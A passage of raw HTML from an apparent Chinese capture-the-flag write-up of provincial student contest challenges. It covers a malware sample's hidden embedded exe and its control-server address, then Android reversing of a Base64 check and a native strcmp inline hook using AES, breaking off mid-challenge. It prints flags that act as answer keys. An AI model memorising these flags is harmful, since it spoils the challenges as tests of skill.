style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414259537531.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415799856038709.png" title="image.png" alt="image.png" width="719" height="588" style="width: 719px; height: 588px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415800327106031.png" title="image.png" alt="image.png" width="719" height="663" style="width: 719px; height: 663px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414259573837.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">使用RH查看资源，发现有内嵌exe，猜测exe为内嵌模块。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414260248474.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415800596012892.png" title="image.png" alt="image.png" width="717" height="514" style="width: 717px; height: 514px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">提出为dump.exe：<br style="box-sizing: border-box;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414260401713.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415800894696729.png" title="image.png" alt="image.png" width="712" height="454" style="width: 712px; height: 454px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">在虚拟机中调试执行，使用火绒剑检测行为</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415801274745618.png" title="image.png" alt="image.png" width="705" height="70" style="width: 705px; height: 70px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414263668375.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">自删除，执行隐藏，连接网络控制服务器</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415801556022779.png" title="image.png" alt="image.png" width="696" height="107" style="width: 696px; height: 107px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414263826277.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><h4 id="toc_63" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">flag</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">flag{56.45.123.21:55233}</code></p><h2 id="toc_64" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.225; font-size: 1.75em; position: relative; padding-bottom: 0.3em; border-bottom: 1px solid rgb(238, 238, 238); caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Mobile - 3</h2><h3 id="toc_65" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">1.signin</h3><h4 id="toc_66" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">君远至此，辛苦至甚。<br style="box-sizing: border-box;">窃谓欲状，亦合依例，并赐此题。<br style="box-sizing: border-box;">(来吧，签个到热个身。)</p><h4 id="toc_67" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">反编译、资源文件等基础知识</p><h4 id="toc_68" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">反编译后打开<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">MainActivity</code>，可以发现关键方法<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">checkPassword</code>，该方法取内置字符串反转后进行<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">Base64</code><span class="Apple-converted-space">&nbsp;</span>解码，将结果与输入内容比较，相等则通过验证。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415801949175993.png" title="image.png" alt="image.png" width="675" height="582" style="width: 675px; height: 582px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415564258761.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><br style="box-sizing: border-box;">根据上述分析，需要获得<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">getFlag</code><span class="Apple-converted-space">&nbsp;</span>方法的返回值，查看上图中<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">getFlag</code><span class="Apple-converted-space">&nbsp;</span>方法的反编译代码，可以看出该方法在资源中获取到字符串后作为返回值返回，故直接去资源文件中查找对应的字符串进行上述运算后即可得到此题Flag。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415802295516996.png" title="image.png" alt="image.png" width="715" height="428" style="width: 715px; height: 428px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415564359443.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><br style="box-sizing: border-box;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415564396437.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415802567196806.png" title="image.png" alt="image.png" width="717" height="339" style="width: 717px; height: 339px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415564448192.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><br></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415803242590787.png" title="image.png" alt="image.png" width="398" height="675" style="width: 398px; height: 675px;"></p><h3 id="toc_69" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">2.fake-func</h3><h4 id="toc_70" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">真亦是假，假亦是真</p><h4 id="toc_71" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Android native</p><h4 id="toc_72" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">so逆向分析，算法分析。程序中加载了一个so check字符串,init_array中对strcmp函数做了hook，在check函数中比较字符串的时候会进入被hook的strcmp然后做一个aes的运算，aes的密钥是动态的base64。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">jadx先打开看MainActivity</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">public&nbsp;class&nbsp;MainActivity&nbsp;extends&nbsp;AppCompatActivity&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;void&nbsp;onCreate(Bundle&nbsp;savedInstanceState)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;super.onCreate(savedInstanceState);
&nbsp;&nbsp;&nbsp;&nbsp;setContentView((int)&nbsp;R.layout.activity_main);
&nbsp;&nbsp;&nbsp;&nbsp;((Button)&nbsp;findViewById(R.id.button)).setOnClickListener(new&nbsp;OnClickListener()&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;void&nbsp;onClick(View&nbsp;v)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(Check.checkflag(((EditText)&nbsp;MainActivity.this.findViewById(R.id.editText)).getText().toString()))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Toast.makeText(MainActivity.this,&nbsp;"you&nbsp;are&nbsp;right~!",&nbsp;1).show();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Toast.makeText(MainActivity.this,&nbsp;"wrong!",&nbsp;1).show();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">调用了so中的Check.checkflag函数校验flag，定位到so中的函数</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">signed&nbsp;int&nbsp;__fastcall&nbsp;Java_com_testjava_jack_fakefunc_Check_checkflag(int&nbsp;a1)
{&nbsp;&nbsp;
&nbsp;&nbsp;signed&nbsp;int&nbsp;v1;&nbsp;//&nbsp;r4
&nbsp;&nbsp;const&nbsp;char&nbsp;*v2;&nbsp;//&nbsp;r5

&nbsp;&nbsp;v1&nbsp;=&nbsp;0;
&nbsp;&nbsp;v2&nbsp;=&nbsp;(const&nbsp;char&nbsp;*)(*(int&nbsp;(**)(void))(*(_DWORD&nbsp;*)a1&nbsp;+&nbsp;676))();
&nbsp;&nbsp;j_getKey();
&nbsp;&nbsp;_android_log_print(4,&nbsp;"INJECT",&nbsp;"asdasd");&nbsp;&nbsp;
&nbsp;&nbsp;if&nbsp;(&nbsp;!strcmp(v2,&nbsp;"this_is_easy_so")&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;v1&nbsp;=&nbsp;1;&nbsp;&nbsp;
&nbsp;&nbsp;return&nbsp;v1;
}</pre><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">发现是与一个固定的字符串对比</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">但是尝试一下程序中提交<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">this_is_easy_so</code>并不对，查看导出表信息，发现存在init_arrary里面对strcmp进行了Inline hook,定位到fake function。发现是aes，key就是动态解密的固定base64字符串。解密得到flag。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">本题关键在定位到init_arrary中的函数。另外可以看到符号中有inline hook之类的函数。这题应该再把这几个符号也去掉。</p><h4 id="toc_73" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">flag</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">flag{fake_func_3nfxvs}</code></p><h3 id="toc_74" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">3.MagicImageViewer</h3><h4 id="toc_75" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">刚写完"高强度"加密代码，就被开除了。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">是不是因为我没写注释？</p><h4 id="toc_76" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><ul class=" list-paddingleft-2" style="margin-bottom: 16px; width: 697.297px; padding: 0px 0px 0px 2em; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><li><p style="margin-top: 16px; margin-bottom: 16px; box-sizing: border-box;">Android native</p></li><li><p style="margin-top: 16px; margin-bottom: 16px; box-sizing: border-box;">算法漏洞分析</p><h4 id="toc_77" style="box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative;">解题过程</h4><p style="margin-top: 16px; margin-bottom: 16px; box-sizing: border-box;">程序首先判断输入内容的长度是否为 16，相等的话将输入内容传入<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">getKey</code><span class="Apple-converted-space">&nbsp;</span>方法中，这里将返回内容记为<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">key</code>，之后将<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">key</code><span class="Apple-converted-space">&nbsp;</span>传入<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">readMagicImage</code><span class="Apple-converted-space">&nbsp;</span>中解密图片。</p></li></ul><p style="margin-top: 16px; margin-bottom: 16px; white-space: normal; box-sizing: border-box;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415805826874494.png" title="image.png" alt="image.png" width="687" height="516" style="width: 687px; height: 516px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415556072266.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><br style="box-sizing: border-box;">继续分析<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">readMagicImage</code>。<br style="box-sizing: border-box;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415556208003.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415806153565412.png" title="image.png" alt="image.png" width="638" height="714" style="width: 638px; height: 714px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">可以看出该方法逐字节处理文件内容，<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">key</code><span class="Apple-converted-space">&nbsp;</span>中的字符循环使用作为参数传入<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">decrypt</code><span class="Apple-converted-space">&nbsp;</span>方法中获取解密结果。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">至此 java 层代码分析完毕，可以得知输入长度为 16，<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">key</code><span class="Apple-converted-space">&nbsp;</span>由输入内容进行某种变换得来，关键方法为<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 